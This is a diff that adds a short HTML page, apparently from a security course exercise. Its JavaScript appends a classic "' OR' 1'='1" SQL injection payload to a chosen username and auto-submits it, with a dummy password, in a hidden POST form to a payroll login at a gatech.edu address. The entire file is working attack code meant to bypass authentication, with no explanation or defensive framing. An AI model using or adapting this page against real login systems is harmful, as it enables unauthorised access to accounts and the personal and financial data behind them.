@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>SQL Injection</title>
+    <script>
+      function magic()
+        {var username = document.getElementById("targetlogin").value +"' OR' 1'='1";
+         document.getElementById("login").value = username;
+         document.getElementById("pw").value = "anything";
+         document.getElementById("x").submit();}
+    </script>
+  </head>
+   <body>
+     <form action="http://payroll.gatech.edu" method="POST" id="x">
+       <input type="hidden" name="action" value="login"/>
+       <input id="login" type="hidden" name="login" value="sdfs"/>
+       <input id="pw"    type="hidden" name="pw" value=""/>
+     </form>
+       <input name="login" id="targetlogin" value="username" />
+       <button id="exploit" onclick="magic()">Submit</button>
+  </body>
+</html>
